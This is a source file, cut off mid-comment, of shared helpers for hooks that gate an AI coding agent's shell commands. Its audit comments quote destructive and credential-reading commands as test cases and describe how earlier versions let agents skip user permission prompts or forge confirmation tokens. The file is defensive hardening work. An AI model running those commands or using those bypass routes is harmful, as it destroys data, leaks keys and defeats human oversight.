// lib.mjs — shared helpers for the GRU953-Studio Bash hooks (scan.mjs, gate.mjs).
// Zero dependencies (Node stdlib only). Both hooks run on every Bash call via
// the same PreToolUse chain in hooks.json, so importing this costs nothing
// extra and keeps the two hooks' shared logic (decisions, tool-call parsing,
// the studio-run marker and the push-capable matcher) defined in exactly one
// place instead of two copies that could quietly drift apart.
//
// Adapted from GRU953-Crew's proven hooks of the same name (2026-07-07
// design) — reused deliberately rather than re-invented, per the lesson
// recorded in this project's own memory that redesigning proven mechanisms
// is a cost, not a feature.

import fs from 'node:fs';
import path from 'node:path';
import process from 'node:process';

// ---- decision helpers --------------------------------------------------------
// Output is built with JSON.stringify, never hand-interpolated: a reason
// string can legitimately contain quotes, backslashes or newlines (several of
// this project's own deny reasons do — they quote shell commands), and a
// hand-built JSON string silently produced INVALID JSON for those. An
// unparseable PreToolUse deny risks failing OPEN (the block not being
// honoured). 2026-07-11 v2.0.0 audit fix — caught by hooks.test.mjs.
//
// Both functions exit 0, matching Claude Code's own documented contract:
// "Claude Code only processes JSON on exit 0. If you exit 2, any JSON is
// ignored" (hooks.md). permissionDecision: "deny" on exit 0 is what blocks
// the call AND surfaces permissionDecisionReason to Claude — exactly the
// documented block-rm.sh pattern. deny() previously called process.exit(2),
// which still blocked the tool call (exit 2 alone forces a PreToolUse block)
// but silently discarded the JSON reason, since exit 2 only reads stderr —
// which this function never wrote to. Claude saw an empty error message
// instead of the remediation text. Fixed 2026-07-12 (Claude-Topics compliance
// sweep, Round 1).
// 2026-08-13, finding X1 (CRITICAL, reproduced by execution — see
// test/repro/X1-auto-approval.mjs). This used to be a single `allow()` that
// emitted `permissionDecision: "allow"` on EVERY path where the hook had no
// objection. Per the official PreToolUse decision contract
// (https://code.claude.com/docs/en/hooks, "PreToolUse Decision Control"):
//
//   | "allow"    | Permit the tool call to proceed without a permission prompt |
//   | "deny"     | Block the tool call ...                                     |
//   | "ask"      | Prompt the user to confirm                                  |
//   | "defer"    | Exit gracefully so the tool can be resumed later            |
//
// Those four are the WHOLE set (hooks.md:987, :1708, :1717 — precedence runs
// deny > defer > ask > allow). Corrected 2026-08-15: this table previously listed
// a fifth value, "escalate", which does not exist. The word appears exactly once
// in the entire document, at hooks.md:1021, inside prose DESCRIBING what "ask"
// does — "allow, deny, or escalate to the user". That one descriptive word reads
// exactly like a value name and sits in the events table, which is where an
// implementer checking the API looks first. Do not reintroduce it: an
// unrecognised value renders no decision at all, so the call falls through to
// normal permission evaluation. Verified by fetching the raw hooks.md and
// grepping it — three separate summarised fetches of that page each returned a
// different answer for this field, so summaries are not evidence here.
//
//   "A hook that doesn't return JSON, or returns JSON without a
//    permissionDecision, doesn't affect the permission flow; the call continues
//    through normal permission evaluation."
//
// So "no objection" was being expressed as "approve this and skip the user's
// prompt". Reproduced live: `rm -rf /important`, `curl http://…/x.sh | sh`,
// `cat ~/.ssh/id_rsa`, `chmod -R 777 /` and `dd if=/dev/zero of=/dev/sda` all
// returned "allow" — i.e. installing a SAFETY plugin silently switched off the
// user's permission prompts for every non-push command. That is OWASP
// LLM06:2025 Excessive Agency: the component held far more authority than its
// job needs. These hooks have a legitimate basis to DENY a push; they have none
// to APPROVE arbitrary commands.
//
// The single function is now deliberately split in two, so that every emission
// of "allow" is an explicit, greppable, reasoned decision rather than a default:
//
//   stepAside()  — the neutral no-decision exit. Used on every path meaning
//                  "not my business": not push-capable, not a studio project,
//                  or (for scan.mjs) no secrets found. scan.mjs is veto-only and
//                  must NEVER authorise anything.
//   authorise()  — emits "allow". Legitimate ONLY where the user has explicitly
//                  confirmed this exact action moments ago and a project-bound,
//                  expiring token proved it. Only gate.mjs's two confirmed-token
//                  paths may call it.
//
// There is deliberately no "defer" value here: a peer review recommended one,
// but no such value exists in the contract above. Emitting nothing IS the
// documented neutral, so stepAside() writes no stdout at all.
//
// `repo-integrity.mjs` enforces the split mechanically (invariant INV17), so a
// future edit cannot quietly reintroduce a blanket approval.
export function stepAside() {
  process.exit(0);
}

// 2026-08-13, independent-review finding F4. `permissionDecision: "allow"` applies
// to the WHOLE command string, so a valid publish token blanket-approved anything
// bolted onto the push — reproduced live:
//   `git push origin main && rm -rf $HOME/important-data`  -> allow
//   `git push origin main; curl http://…/x.sh | sh`        -> allow
// That is precisely the hazard X1 was raised against, and it contradicts
// authorise()'s own contract: legitimate only where the user confirmed THIS EXACT
// action. Rather than deny such commands outright — which would break ordinary
// `git add … && git commit … && git push …` flows — the gate now ESCALATES them:
// the token still proves intent, but the extra segments get a human's eyes
// instead of a silent approval. This is the same "escalate rather than guess"
// principle chosen for the wider architecture.
//
// NAMING TRAP, and the reason this function was broken from the day it was
// written (2026-08-13 to 2026-08-15): "escalate" is the name of the PRINCIPLE,
// not of the wire value. The contract expresses escalation as "ask". This
// function emitted 'escalate' — an undocumented value — so it rendered no
// decision, and the call fell through to normal permission evaluation. In an
// interactive session that still prompts, so the bug was invisible; in auto mode
// it is exactly the silent approval finding F4 exists to prevent, which is the
// one case the comment above claims to cover.
//
// The function keeps its conceptual name deliberately — it is what the
// architecture calls this move — but the emitted value must stay 'ask'.
// `test/repro/X37-invalid-permission-decision.mjs` asserts the general invariant
// (no hook may emit a permissionDecision outside the documented set), so this
// class cannot recur if the platform later renames or adds a value.
export function escalate(reason) {
  process.stdout.write(
    JSON.stringify({
      hookSpecificOutput: {
        hookEventName: 'PreToolUse',
        permissionDecision: 'ask',
        permissionDecisionReason: String(reason),
      },
    }) + '\n',
  );
  process.exit(0);
}

// 2026-08-15, findings X91 and X110. `authorise(reason)` used to live here and emit
// `permissionDecision: 'allow'`, which does not mean "no objection" — it SUPPRESSES the
// permission prompt the user would otherwise have seen.
//
// X91 removed its last caller. `gate.mjs` granted that on the strength of a record under
// Dev-Memory/, and everything the gate can read, an agent on the same machine can write:
// the token is a sha256 of the project path, and confirm-publish.mjs issued one with
// stdin closed. So the record now downgrades a hard `deny` to an `ask` instead, and no
// hook is entitled to emit `allow` at all.
//
// X110 then showed the invariant guarding this could only see one file — INV17 tested
// `f === 'scan.mjs'`, while its own comment claimed "only gate.mjs may call it". Rather
// than widen the guard, the capability is DELETED: a function whose only permitted number
// of callers is zero is dead code that exists to be misused. Removing a dangerous
// capability beats policing it, which is the lesson of this whole round of findings.
//
// INV17 now asserts this absence in both directions — no hook calls authorise(), and
// lib.mjs does not export it. Reproduction: hooks/test/repro/X110-no-blanket-approval.mjs.
//
// If a genuine need for `allow` ever arises, re-adding it is a deliberate decision with
// its own reasoning, not a one-line restoration: it means re-opening the permission
// architecture recorded in decisions/2026-08-15-permission-architectures.md.
export function deny(reason) {
  process.stdout.write(
    JSON.stringify({
      hookSpecificOutput: {
        hookEventName: 'PreToolUse',
        permissionDecision: 'deny',
        permissionDecisionReason: String(reason),
      },
    }) + '\n',
  );
  process.exit(0);
}

// ---- read the tool call ------------------------------------------------------
// 2026-07-31 maintenance fix (HIGH, pre-existing, reproduced by execution):
// `fs.readFileSync(0)` throws EAGAIN/EWOULDBLOCK when fd 0 is a non-blocking
// pipe that has not yet had its payload written by the parent process — a
// real, reproducible race when the harness spawning this hook (Claude Code
// invoking scan.mjs/gate.mjs as PreToolUse hooks) hasn't finished writing the
// tool-call JSON before this process's Node startup reaches this read.
// Reproduced deterministically: a child process reading fd 0 via
// `fs.readFileSync(0,'utf8')` while the parent writes to the far end of a
// pipe after a short delay throws EAGAIN before the write lands (proven in
// hooks.test.mjs's readStdinCore unit tests, which inject a mock reader
// rather than depend on real OS timing — a real EAGAIN race can't be made to
// fire reliably from spawnSync(..., {input}), which always hands the child a
// fully-written buffer synchronously).
//
// The previous bare `catch { return ''; }` treated that TRANSIENT failure
// identically to "stdin genuinely has no data" (a real, immediate EOF, which
// readFileSync returns as '' with no error at all) — so a lost read silently
// became an empty command AND an empty cwd. scan.mjs/gate.mjs both then read
// CMD as '' (isPushCapable('') happens to fail closed on its own), but
// extractCwd(INPUT) also comes back '', which can make findStudioRoot()
// resolve against the wrong fallback (this hook process's own cwd, not the
// tool call's actual cwd) and stand down (allow()) on a command it never
// actually inspected — a real, if narrow, bypass window for a `git push` or
// `gh repo create --public` racing this exact timing.
//
// Fix: retry ONLY on EAGAIN/EWOULDBLOCK, for a short bounded total wait
// (STDIN_RETRY_BUDGET_MS), then give up. Critically, "gave up" is signalled
// by THROWING StdinReadFailure, never by returning '' — a caller that gets ''
// back has proof there was no data; a caller that gets a thrown failure has
// no such proof and must fail closed. scan.mjs and gate.mjs both DENY on this
// exception (see their main()); the three non-security callers of readStdin
// (session-start.mjs, subagent-statusline.mjs, self-heal-nudge.mjs) each
// already catch it (or now do) and fall back to their existing "no input"
// behaviour, since none of them is a security gate.
//
// 2026-07-31 further maintenance fix (HIGH, third-reviewer finding,
// reproduced live against a real non-blocking FIFO with a deliberately
// chunked writer before this fix, then re-confirmed fixed): the retry above
// re-ran `fs.readFileSync(0,'utf8')` as a single, WHOLE-READ call on every
// attempt. That call is not idempotent on a real non-blocking pipe: Node's
// readFileSync loops internally, and when a real writer dribbles bytes in
// more than one chunk, the FIRST call can genuinely consume whatever bytes
// are currently available on the fd and THEN throw EAGAIN waiting for more —
// the bytes it already consumed are gone from the pipe but never returned to
// the caller, because readFileSync only returns a value on total success. A
// later retry of the SAME whole-read call then only sees the bytes written
// AFTER that point, and — critically — returns them as a clean, error-free
// success once EOF is reached, indistinguishable from a genuine complete
// read. Reproduced: a 66-byte JSON payload written as 57 bytes, an 80ms
// pause, then the remaining 9 bytes, came back from the old retry loop as
// exactly those trailing 9 bytes with no exception at all — a silently
// truncated, invalid-JSON payload that both extractCommand() and
// extractCwd() then read as `''`, reproducing the exact bypass window
// described two paragraphs up (verified end-to-end: with a real committed
// secret, zero confirmation tokens, and the hook process's own cwd differing
// from the lost tool-call cwd, both scan.mjs and gate.mjs `allow`ed a `git
// push` under this exact chunked-read condition).
//
// Fixed by never treating a single call to the underlying reader as "the
// whole message". The reader passed in is now a per-CHUNK primitive (see
// readStdin() below, which hands `readStdinCore` a `fs.readSync(0, buf, ...)`
// closure), and this function itself owns the accumulation: each
// successful chunk (however many bytes it returns, including zero, which
// signals real EOF) is appended to a growing buffer, and only decoded to a
// string once EOF is reached or the retry budget is exhausted. An EAGAIN
// during this loop discards NOTHING already accumulated — it just waits
// briefly and retries the NEXT chunk read, appending to what is already
// held. This is what makes the loop idempotent: unlike readFileSync, a
// single chunk read either returns a byte count with those bytes genuinely
// consumed and kept, or throws having consumed nothing at all — there is no
// third "consumed silently and discarded" outcome for the retry to land on.
// Giving up (never reaching EOF within budget) still throws
// StdinReadFailure, exactly as before, rather than returning whatever
// partial bytes happened to accumulate — a caller must not be able to
// mistake a partial read for a complete one.
//
// readStdinCore takes the actual per-chunk read operation as a parameter
// specifically so hooks.test.mjs can drive the retry/accumulate/give-up
// logic deterministically with a mock reader that returns controlled partial
// byte counts and/or fails a controlled number of times before succeeding
// (or never succeeds, to prove the give-up path) — a flaky, real-timing-
// dependent test would be worse than no test at all. readStdin() below is
// the one real caller, using the real synchronous read.
export class StdinReadFailure extends Error {}
export const STDIN_RETRY_BUDGET_MS = 500;
export const STDIN_RETRY_DELAY_MS = 10;
// Size of each accumulation chunk for the real reader. Large enough that an
// ordinary tool-call JSON payload (a few hundred bytes to a few KB) is read
// in one or two chunks in the common case — no added latency there — while
// still bounding a single read call's memory use.
const STDIN_CHUNK_BYTES = 65536;
function sleepMs(ms) {
  // A genuinely blocking sleep with no dependency: setTimeout/Promises don't
  // run inside a synchronous top-to-bottom hook script with no event loop
  // turn given back to them. Atomics.wait blocks the current thread for real.
  Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, ms);
}
// `readChunk(buf)` must behave like `fs.readSync`: fill (a prefix of) `buf`
// and return the number of bytes written, with `0` meaning genuine EOF, or
// throw (with `.code` set for a transient EAGAIN/EWOULDBLOCK) having written
// nothing. It must NOT return a full string — that per-call "all or nothing"
// contract is exactly what made the old single-shot readFileSync call
// non-idempotent under a real chunked write (see the long comment above).
export function readStdinCore(readChunk, opts = {}) {
  const budgetMs = opts.budgetMs ?? STDIN_RETRY_BUDGET_MS;
  const delayMs = opts.delayMs ?? STDIN_RETRY_DELAY_MS;
  const chunkBytes = opts.chunkBytes ?? STDIN_CHUNK_BYTES;
  const start = Date.now();
  const chunks = [];
  let lastErr = null;
  for (;;) {
    const buf = Buffer.allocUnsafe(chunkBytes);
    let n;
    try {
      n = readChunk(buf);
    } catch (e) {
      lastErr = e;
      const transient = Boolean(e) && (e.code === 'EAGAIN' || e.code === 'EWOULDBLOCK');
      if (!transient || Date.now() - start >= budgetMs) break;
      sleepMs(delayMs);
      continue; // nothing was consumed by the failed attempt — retry the SAME unread data
    }
    if (n === 0) {
      // Genuine EOF: everything accumulated so far (possibly nothing at all,
      // a real empty stdin) IS the whole message.
      return Buffer.concat(chunks).toString('utf8');
    }
    // A successful partial read is real data, kept permanently — an EAGAIN
    // on a LATER iteration can never discard it, since it is not the loop
    // variable being retried.
    chunks.push(n === buf.length ? buf : buf.subarray(0, n));
  }
  const detail = (lastErr && (lastErr.code || lastErr.message)) || 'unknown error';
  throw new StdinReadFailure(`could not read stdin (${detail}) after retrying`);
}
export function readStdin() {
  return readStdinCore((buf) => fs.readSync(0, buf, 0, buf.length, null));
}
// 2026-07-12 Round 7 audit fix (real gap, verified via Claude Code's own
// docs and a live GitHub issue, not previously disclosed): hooks.json's
// PreToolUse matcher only ever listed "Bash" — but Claude Code's separate
// PowerShell tool (the automatic default on native Windows without Git
// for Windows/Git Bash, and opt-in elsewhere via
// CLAUDE_CODE_USE_POWERSHELL_TOOL=1) is a genuinely different tool, so
// neither scan.mjs nor gate.mjs ever ran at all for a command executed
// through it — not a missed obfuscation pattern, a complete, silent
// non-invocation of the whole publish-safety mechanism on a documented,
// non-obscure configuration. hooks.json's matcher now also lists
// "PowerShell". Official docs (code.claude.com/docs/en/hooks.md,
// tools-reference.md) do not formally document the PowerShell tool's
// tool_input schema, but a live captured payload (github.com/anthropics/
// claude-code issue #57137) shows it uses the same `command` field name as
// Bash — read as primary here, with `script` kept as a defensive fallback
// in case a future/undocumented PowerShell payload shape differs, since
// getting this wrong means silently reading no command at all rather than
// an error that would be noticed.
export function extractCommand(input) {
  let obj;
  try {
    obj = JSON.parse(input);
  } catch {
    return '';
  }
  const ti = obj && typeof obj === 'object' && !Array.isArray(obj) ? obj.tool_input : undefined;
  if (ti === null || ti === undefined || typeof ti !== 'object' || Array.isArray(ti)) return '';
  const cmd =
    typeof ti.command === 'string'
      ? ti.command
      : typeof ti.script === 'string'
        ? ti.script
        : ti.CommandLine;
  return typeof cmd === 'string' ? cmd : '';
}
export function extractCwd(input) {
  let obj;
  try {
    obj = JSON.parse(input);
  } catch {
    return '';
  }
  if (!obj || typeof obj !== 'object' || Array.isArray(obj)) return '';
  const c =
    typeof obj.cwd === 'string'
      ? obj.cwd
      : obj.tool_input && typeof obj.tool_input.Cwd === 'string'
        ? obj.tool_input.Cwd
        : undefined;
  return typeof c === 'string' ? c : '';
}

// 2026-07-26 Stage 3 fix (audit finding 22). Five of this project's own
// gates (content-check, quality-gate, memory-integrity, dashboard, and — not
// originally named in the finding, found while fixing the other four —
// traceability-check) each opened with their OWN copy of
// `!fs.existsSync(p) || !fs.statSync(p).isDirectory()`: two separate,
// unguarded filesystem calls, racing against whatever else might touch that
// path between them. If Dev-Memory is deleted, replaced, or renamed in that
// window, the second call (`statSync`, with no try/catch of its own) throws
// a raw Node stack trace instead of this project's own plain-English
// contract — exactly the crash class finding 21 already fixed for reads and
// writes, just for an existence CHECK instead. findStudioRoot() right below
// already gets this right — one guarded stat call, not two racing ones —
// this generalises that same already-correct pattern for reuse by all five.
export function isDirectory(p) {
  try {
    return fs.statSync(p).isDirectory();
  } catch {
    return false;
  }
}

// ---- studio run marker (the run-scope gate) --------------------------------------
// The studio's project marker is its Dev-Memory folder. Walk up from `start`
// looking for one; return the project root that contains it, or null when no
// studio project exists anywhere up the tree (=> no active studio run here).
export function findStudioRoot(start) {
  let d = path.resolve(start);
  for (;;) {
    try {
      if (fs.statSync(path.join(d, 'Dev-Memory')).isDirectory()) return d;
    } catch {
      // not present at this level; keep walking
    }
    const parent = path.dirname(d);
    if (parent === d) return null;
    d = parent;
  }
}

// Node's own fs system-error messages already start with the error code
// (e.g. "EISDIR: illegal operation..."), so only prepend e.code when the
// message doesn't already carry it — otherwise a formatted message reads
// "EISDIR: EISDIR: ...". Shared by writeConfirmationRecordOrExit below and
// roster-check.mjs's own guarded read, so the two don't drift apart.
export function formatFsError(e) {
  return e.message && e.code && e.message.startsWith(e.code)
    ? e.message
    : `${e.code || 'error'}: ${e.message}`;
}

// 2026-07-26 audit finding (further pass after stage 2): all four
// confirm-*.mjs scripts (confirm-checkpoint, confirm-go-public,
// confirm-memory-persist, confirm-publish) wrote their token record with a
// bare, unguarded `fs.writeFileSync` — reproduced by execution: making the
// target path a directory instead of a file (a plausible outcome of a stray
// `mkdir`, a bad merge, or a case-folding artefact on Windows/macOS) throws
// `EISDIR` with a full Node stack trace to stderr and exit 1, the exact
// "never show a raw stack trace" guarantee this codebase otherwise enforces
// everywhere else. A read-only Dev-Memory (EACCES), a full disk (ENOSPC) or
// a read-only mount (EROFS) would fail the same way. Centralised here so
// all four scripts get one plain-English failure message instead of four
// copies that could drift, matching how this file already centralises
// findStudioRoot() for the same four scripts.
export function writeConfirmationRecordOrExit(record, content, label) {
  try {
    fs.writeFileSync(record, content, 'utf8');
  } catch (e) {
    process.stderr.write(
      `${label}: could not write the confirmation record at ${record} ` +
        `(${formatFsError(e)}). Check that Dev-Memory is a writable folder — ` +
        `not a file or directory in the wrong place, not read-only, and the ` +
        `disk is not full — then try again.\n`,
    );
    process.exit(1);
  }
}

// ---- confirmation-token TTL binding (shared by gate.mjs AND scan.mjs) --------
// 2026-07-26 audit finding 12, originally fixed only in gate.mjs: the token and
// its timestamp were not BOUND — each checker matched the token on one line,
// then evaluated the TTL against the WHOLE file with /^ISSUED:(\d+)$/m. So a
// record containing an expired approval line plus any fresh `ISSUED:` line
// anywhere — an appended second approval, a hand-edited or concatenated file,
// a stale token left above a newer one — re-validated the expired token.
//
// 2026-07-26 further-pass audit fix: this fix originally lived ONLY in
// gate.mjs as a local, unexported function. scan.mjs has its own SEPARATE
// consumer of the same MEMORY-PERSIST-APPROVED record (memoryPersistAllowed,
// deciding whether to skip the dev-memory-path finding) and had its own
// independent, un-fixed copy of the old unbound logic — confirmed by
// execution to still accept an expired token when an unrelated fresh
// `ISSUED:` line sits elsewhere in the file. Moved here so there is exactly
// ONE implementation both hooks share, closing the bug in scan.mjs and
// removing the risk of the two ever drifting apart again the way they just
// had.
//
// The four confirm-*.mjs writers all emit exactly `<TOKEN>\nISSUED:<ms>\n`, so
// the timestamp that belongs to a token is the line IMMEDIATELY after it.
// Requiring that adjacency binds the pair and closes the substitution, while
// remaining exactly what every writer already produces. Still fails closed:
// no adjacent ISSUED line means not confirmed.
//
// (Investigated and NOT a defect, recorded so it is not "fixed" later: the
// original /^ISSUED:(\d+)$/m tolerated CRLF correctly — in JavaScript, `$` in
// multiline mode matches before CR as well as LF. Verified by execution.)
export const CONFIRMATION_TTL_MS = 60 * 60 * 1000; // 60 minutes
export function withinTtl(raw) {
  const issuedAt = parseInt(raw, 10);
  return (
    Number.isFinite(issuedAt) &&
    Date.now() - issuedAt <= CONFIRMATION_TTL_MS &&
    Date.now() - issuedAt >= 0
  );
}
export function tokenConfirmedWithinTtl(text, expected) {
  const lines = text.split(/\r?\n/);
  for (let i = 0; i < lines.length; i++) {
    if (lines[i].trim() !== expected) continue;
    const next = (lines[i + 1] ?? '').trim();
    const m = /^ISSUED:(\d+)$/.exec(next);
    if (m && withinTtl(m[1])) return true;
    // Keep scanning: a later, correctly-paired occurrence is still valid.
  }
  return false;
}

// ---- "done means proven" contradiction detector (shared by three gates) -----
// A status/evidence cell that narrates its own row is currently broken or
// unproven invalidates an otherwise-passing verdict — verify-progress.mjs,
// quality-gate.mjs and traceability-check.mjs each do conceptually the same
// job (don't let a row claim "done"/"met"/"pass" while its own text says
// otherwise) but had drifted into three DIFFERENT copies of this pattern.
//
// 2026-07-26 audit finding 1/35: the original pattern only matched the literal
// word "exit" immediately followed by whitespace and a digit, so the far more
// natural phrasing "exit code 1" / "exited with code 1" never matched. Fixed
// in quality-gate.mjs and traceability-check.mjs (finding 35) but NOT in
// verify-progress.mjs — the exact file finding 1 was originally about —
// because each carried its own independent copy and the fix was never ported
// back to all three. Reproduced by execution: a PROGRESS.md row with
// "verified: npm test -> exit 0; however a later re-run gave exit code 1"
// returned {"status":"clean"} from verify-progress.mjs while the identical
// text in a QUALITY-GATE.md row was correctly BLOCKED.
//
// Separately, quality-gate.mjs alone had a `regress(?:ed|ion)` alternative
// that traceability-check.mjs and verify-progress.mjs both lacked — reproduced
// the same way: "npm test green, but a regression was spotted in nightly
// build" was silently accepted by both.
//
// Moved here as the ONE shared pattern all three now use, so this specific
// three-way drift — the exact failure mode a background review agent was
// asked to hunt for — cannot recur.
//
// 2026-08-05 further-pass audit fix. Three hardening changes, each reproduced
// by execution before being made:
//  1. A negative lookbehind for not/never/no makes a contradiction phrase that
//     is itself NEGATED stop counting ("not currently failing", "the suite
//     never fails", "no exit code 1" are all positive claims — never blocked).
//     The guard sits right before the contradiction word, so "the suite never
//     fails" stays clean while "currently failing" still matches.
//  2. `current <noun> fails` (adverb/adjective + noun + plain "fails") was
//     never covered — "currently fails" and "the current build fails" both
//     slipped through the old `currently broken|failing` alternative. Added
//     `current(?:ly)? <noun?> fails?` (noun optional, with its own negation
//     guard so "current test never fails" is not blocked).
//  3. `regress(?:ed|ion)` matched the bare noun anywhere, so a legitimately
//     named row or task "Regression tests"/"regression suite" was wrongly
//     BLOCKED while a real "a regression was spotted" went through the same
//     path. The noun form now only counts when followed by a failure verb
//     ("regression was spotted/found/seen/..."); the verb `regressed` still
//     counts alone. Combined with scoping CONTRADICTION_RE to the evidence/
//     verification CELL (not the whole row) in quality-gate.mjs and
//     traceability-check.mjs, a label word can never trip the gate again.
// 2026-08-13, finding X11b (defence in depth). `unverified` was not among the
// contradiction terms, even though `not verified` and `hasn't been verified`
// were. verify-progress.mjs's own VERIFIED_RE now carries a lookbehind that stops
// `unverified:` matching `verified:`, which closes the reproduced case; this adds
// a second line of defence so a row carrying BOTH a valid `verified:` clause and
// an "unverified" admission elsewhere still blocks.
//
// Narrowed the same day, after a false positive caught by running the gate
// against this repository's own memory. A bare `\bunverified\b` blocked a
// legitimately green row whose note read "confirming the researcher's unverified
// inference" — prose about a THIRD PARTY's claim, not a statement that this task
// is unverified. So the term only counts when it is actually making a claim about
// verification state: as an evidence prefix (`unverified:` — the reproduced bug
// shape), or after is/are/remains/still/currently. This is the same
// over-broad-pattern mistake this file has had to correct before, in the
// `regress(?:ed|ion)` and "Regression tests" cases below and above.
// 2026-08-13, independent-review findings F7 and F8 (both reproduced). Two
// defects in the alternatives added earlier the same day:
//
// F7: `unverified[ \t]*:` sat inside the enclosing `\b( … )\b`. A trailing `\b`
// after a colon requires a WORD character immediately next, which real evidence
// never has — so `unverified: pending` did not match and the alternative was dead
// for its own primary target. Rewritten as `unverified(?=[ \t]*:)`, a lookahead,
// so the word boundary lands on the word itself.
//
// F8: the check was spelling-specific. `un-verified:` and `not-verified:` both
// satisfied verify-progress.mjs's letter-only lookbehind AND had no alternative
// here, so a hyphenated spelling passed both halves. Added explicitly.
export const CONTRADICTION_RE =
  /(?<!\b(?:not|never|no)[ \t]+)\b(unverified(?=[ \t]*:)|(?:un|non|not)-verified|(?:is|are|remains?|still|currently)[ \t]+unverified|exit(?:ed)?(?:[ \t]+with)?[ \t]+code[ \t]*:?[ \t]*[1-9]\d*|exit[ \t]+[1-9]\d*|now[ \t]+fails?|currently[ \t]+(broken|failing)|current(?:ly)?[ \t]+(?:[^,;|()]{0,40}?[ \t]+)?(?<!\b(?:not|never|no)[ \t]+)fails?|has(?:n'?t| not)[ \t]+(?:yet[ \t]+)?been[ \t]+(?:re-?)?verified|not[ \t]+(?:yet[ \t]+)?verified|still[ \t]+fail(?:s|ing)?|regress(?:ed|ion(?=[ \t]+(?:(?:was|is|are|were|has|had|have|got|been)[ \t]+)*(?:spotted|found|seen|detected|introduced|observed|occurred|appeared|reported|caught))))\b/i;

// ---- shared markdown-table patterns (fixes a six-way drift) ------------------
// 2026-07-29 maintenance fix (audit finding 4). SEPARATOR_ROW_RE (the `| :-- |
// :-- |` divider row every GFM table has) used to be defined separately in
// content-check.mjs, dashboard.mjs, memory-integrity.mjs, traceability-check.mjs,
// quality-gate.mjs and verify-progress.mjs — six hand-maintained copies, which
// is exactly how verify-progress.mjs's copy drifted out of sync with the other
// five (missing the trailing `\s*` before the closing `$`, so a separator row
// with trailing whitespace was not recognised as one). Moved here as the ONE
// shared pattern all six now use, the same "one shared pattern now, not three
// that can drift" playbook CONTRADICTION_RE above already used for this exact
// class of problem.
//
// 2026-07-29 maintenance fix (round 3, F2): `clients/cli/src/status.js` has a
// seventh, identical copy of this same regex. That copy is not covered by
// the "cannot drift apart again" claim above — and can't be, by necessity:
// it ships in a separate CommonJS package with no shared module boundary
// onto this ESM plugin, so it genuinely cannot import lib.mjs (see its own
// file header comment). Keep both copies in sync by hand if this pattern
// ever changes.
export const SEPARATOR_ROW_RE = /^\s*\|?\s*:?-+:?\s*(\|\s*:?-+:?\s*)*\|?\s*$/;

// A cell that is really empty or a plain placeholder value — treated as no
// evidence/no data by every gate that checks for meaningful content. Was
// duplicated identically in memory-integrity.mjs, traceability-check.mjs and
// quality-gate.mjs; moved here for the same reason as SEPARATOR_ROW_RE above.
// content-check.mjs keeps its own separate, deliberately WIDER pattern (it
// additionally accepts "pending"/"placeholder") rather than importing this
// one, because it is a genuine superset used for a different purpose there
// (content provenance/rights, not evidence) — forcing the two to be the same
// pattern would either narrow content-check.mjs's real requirement or widen
// what these other three files accept.
//
// 2026-08-07 audit: `pending` and `tbc` added here after finding a real hole,
// and this note revises the paragraph above rather than contradicting it in
// silence. That paragraph is about whether the two patterns should be UNIFIED —
// they should not, and they still are not; content-check.mjs keeps its own
// wider superset. It does not address the separate question of whether
// `pending` is evidence, and it is not: a requirement marked **met** whose
// Verification cell reads exactly `pending` is self-contradictory by
// construction, and traceability-check.mjs's own header promises that "a
// requirement marked met/done must carry a non-placeholder Verification cell".
// Reproduced against this repo's own golden fixture, which uses `pending` as
// the verification value for its not-yet-done requirements (R3, R4) — flipping
// R3's status to `met` while leaving that literal `pending` in place returned
// {"status":"clean"}, so the project's own canonical word for "no evidence
// yet" was the one word the evidence check could not see.
// Both additions are whole-cell only (the pattern is anchored `^...$` after
// trimming and de-emphasis), so prose that merely contains the word is
// unaffected — only a cell that says nothing else.
export const PLACEHOLDER_RE = /^(|[-—–]+|tbd|tbc|todo|none|n\/?a|pending|\.\.\.)$/i;

// 2026-08-15, finding X143 / quality-gate D7 (reproduced). PLACEHOLDER_RE above is whole-cell
// anchored, so `tbd` is caught and `tbd - will attach the proof after the demo` is not. The
// second is the one that actually gets written: the same empty claim with an apology attached.
//
// The obvious fix — treat any cell STARTING with a placeholder word as a placeholder — was
// measured before being written, and it is wrong. `none of the tests failed` currently passes
// and must keep passing: it is an ordinary English sentence reporting a real result. So the
// prefix rule applies only to the words that cannot begin a genuine sentence of evidence:
//
//     tbd, tbc, todo, pending, placeholder   -> an excuse may follow, and it is still nothing
//     none, n/a, dashes, ellipsis            -> whole-cell only; these DO start real sentences
//
// The separator after the word is required, so "todos are tracked in the issue tracker" and
// "pending review by the security team" — both real statements — are untouched.
export const PLACEHOLDER_WITH_EXCUSE_RE = /^(tbd|tbc|todo|pending|placeholder)\b\s*[-—–:,;(]/i;

// True when a cell says nothing of substance: a bare placeholder, or a placeholder with an
// excuse attached. Callers that judge evidence should use this rather than PLACEHOLDER_RE.
export function isPlaceholderEvidence(cell) {
  const t = String(cell == null ? '' : cell).trim();
  return PLACEHOLDER_RE.test(t) || PLACEHOLDER_WITH_EXCUSE_RE.test(t);
}

// ---- text/frontmatter primitive (CRLF/BOM tolerant) --------------------------
// 2026-07-26 audit finding 9 (MAJOR). repo-integrity.mjs (and mcp-server.js)
// each read frontmatter with `text.match(/^---\n([\s\S]*?)\n---/)` — an
// LF-only pattern. On a Windows checkout with git's default
// core.autocrlf=true, every agent and skill file's frontmatter block is
// CRLF, so this failed to match on ALL 38 agents and 35 skills at once —
// reported as "missing name: frontmatter" across the board. Verified by
// execution against a real CRLF-encoded fixture.
//
// Every markdown-parsing hook in this project already tolerates CRLF when
// splitting body lines (`split(/\r?\n/)`); this frontmatter regex and its
// counterpart in mcp-server.js were the only two LF-only holdouts in the
// entire tree. Centralised here so future readers get this for free rather
// than each hand-rolling their own `\r?\n` pattern (which is exactly how the
// gap opened in the first place — one file's parser was never brought in
// line with the rest).
//
// stripBom() additionally handles the UTF-8 byte-order mark some Windows
// editors prepend, which would otherwise break the `^---` anchor the same
// way a CRLF-only regex does — three invisible bytes, same failure shape.
export function stripBom(text) {
  return typeof text === 'string' && text.charCodeAt(0) === 0xfeff ? text.slice(1) : text;
}

// Extracts the frontmatter block's raw inner text (the part between the two
// `---` fences), tolerant of LF, CRLF and a leading BOM. Returns null if there
// is no frontmatter block at all — distinct from "frontmatter present but a
// given field is absent", which is frontmatterField()'s job below.
export function frontmatterBlock(text) {
  const stripped = stripBom(text);
  if (!stripped) return null;
  const m = stripped.match(/^---\r?\n([\s\S]*?)\r?\n---(?:\r?\n|$)/);
  return m ? m[1] : null;
}

// ---- push-capable command matcher (fail CLOSED) ------------------------------
// Shared by scan.mjs and gate.mjs, so the phase gate and the secret scan cover
